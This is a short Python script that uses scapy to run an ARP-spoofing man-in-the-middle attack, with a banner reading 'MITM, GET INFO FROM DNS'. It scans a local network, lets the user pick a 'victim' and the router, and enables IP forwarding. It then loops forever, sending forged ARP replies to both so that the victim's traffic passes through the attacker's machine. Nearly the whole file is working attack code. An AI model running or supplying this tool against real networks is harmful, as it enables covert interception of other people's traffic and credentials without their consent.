from scapy.all import ARP, Ether, srp   
import scapy.all as scap
import os
import time
import platform
import ipaddress

def checkSystem():
    os.system('clear')

    version = platform.version()
    split1 = version.split("-")[1]
    split2 = split1.split(" ")[0]

    if split2 == "Ubuntu" or "Debian":
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def graphBar():
    os.system('clear')
    print('     -------------------------')
    print("     |MITM, GET INFO FROM DNS|")
    print('     -------------------------')
    print("")

def login():
    print("Enter network ip : (example : 192.168.1.0/24)", "\n")

    target_ip = input()
    if not checkIP(target_ip):
        os.system('clear')
        graphBar()
        print("This is not a valid IP, try again")
        login()

    for x in range (0,4):  
        b = "Scanning" + "." * x
        print (b, end="\r")
        time.sleep(0.8)
    return target_ip

def scan(target):
    global ip
    global mac
    arp = ARP(pdst=target)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    result = srp(packet, timeout=3, verbose=0)[0]

    ip = []
    mac = []

    for _, received in result:
        ip.append(received.psrc)
        mac.append(received.hwsrc)

    return ip, mac
    
def isGoodNetwork(target, ip, mac):
    if len(ip) <= 1:
        global victim
        global router
        print("There's no one in this network, are you sure it is the one you meant to explore ? If you are, you can refresh with: 'refresh'.\nYou can quit with 'ctrl+c'.\nYou can also change your network target simply by typing 'change'")
        userInput = input()
        if userInput == "refresh":
            graphBar()
            print("Refreshing network", target)
            ip, mac = scan(target)
            victim, router = isGoodNetwork(target, ip, mac)
            return victim, router
        elif userInput == "change":
            graphBar()
            target = login()
            ip, mac = scan(target)
            victim, router = isGoodNetwork(target, ip, mac)
            return victim, router
    else:
        print("ips in the network" , ip)
        print("macs in the network", mac)
        print("Select your target ip. (1, 2, 3)...")
        victim = input()
        print("Select router ip. (1, 2, 3)... (Usually ends by .254)")
        router = input()
        return victim, router

def checkIP(ipCheck):
    ipCheck = ipCheck.split("/")[0]
    result = True
    try:
        ipaddress.ip_network(ipCheck)
    except:
        result = False
    return result

victim, router = 0, 0
checkSystem()
graphBar()
target = login()
ip, mac = scan(target)
victim, router = isGoodNetwork(target, ip, mac)

while True: 
    arp_response = ARP(pdst=ip[int(victim)-1], hwdst=mac[int(victim)-1], psrc=ip[int(router)-1])
    scap.send(arp_response, count = 1)
    arp_response = ARP(pdst=ip[int(router)-1], hwdst=mac[int(router)-1], psrc=ip[int(victim)-1])
    scap.send(arp_response, count = 1)